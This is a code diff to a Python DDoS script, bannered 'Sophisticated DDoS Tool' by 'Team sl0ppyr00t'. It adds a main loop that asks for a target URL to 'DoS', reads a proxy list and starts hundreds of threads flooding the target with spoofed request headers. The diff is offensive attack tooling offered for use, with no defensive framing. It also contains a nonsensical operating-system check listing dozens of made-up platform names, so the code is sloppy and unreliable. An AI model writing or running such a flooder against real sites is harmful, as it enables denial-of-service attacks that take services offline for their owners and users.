@@ -8237,8 +8237,6 @@ class Spammer(threading.Thread):
             'User-Agent': random.choice(ua),
             'Keep-Alive': random.randint(110, 9960),
             'Referer': random.choice(ref),
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-
         }
         self.Lock = threading.Lock()
         self.lista = lista
@@ -8279,3 +8277,63 @@ class Spammer(threading.Thread):
 
 class MainLoop():
     def __init__(self):
+        if os.name in ("nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos", "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux", "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris", "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios", "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian", "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"):
+            self.title()
+
+    def title(self):
+        sys.stdout.write("                                                                                          \n")
+        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
+        sys.stdout.write("             " + "0             Sophisticated DDoS Tool        ""          0\n")
+        sys.stdout.write("             " + "0        By Team sl0ppyr00t                ""              0\n")
+        sys.stdout.write("             " + "0        Press Ctrl+C to stop the attack   ""          0\n")
+        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
+        sys.stdout.write("\n")
+
+    def check_url(self, url):
+        if url[:4] == "www.":
+            url = "https://" + url
+        elif url[:4] == "http":
+            pass
+        else:
+            url = "https://" + url
+        return url
+
+    def setup(self):
+        global N, Close, Request, Tot_req
+        while True:
+            print(Fore.RED + "0000000000000000000000000000")
+            print(Fore.YELLOW + "Sophisticated DDoS Tool")
+            print(Fore.RED + "0000000000000000000000000000")
+            print(Style.RESET_ALL)
+            url = input('> Enter the target URL to DoS: ')
+            url = self.check_url(url)
+            try:
+                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
+                response = urllib.request.urlopen(req)
+                break
+            except:
+                print('> Could not open the specified URL.')
+
+        while True:
+            try:
+                proxy_file = input('> Enter the path to the proxy list: ')
+                with open(proxy_file, 'r') as in_file:
+                    proxy_list = [i.strip() for i in in_file.readlines()]
+                break
+            except:
+                print('Error reading the proxy list file.')
+
+        while True:
+            try:
+                num_threads = int(input('> Enter the number of threads [600]: ') or '600')
+                break
+            except:
+                print('Invalid input. Please enter a number.')
+
+        for i in range(num_threads):
+            Spammer(url, i + 1, proxy_list).start()
+
+if __name__ == '__main__':
+    N = 0
+    b = MainLoop()
+    b.setup()
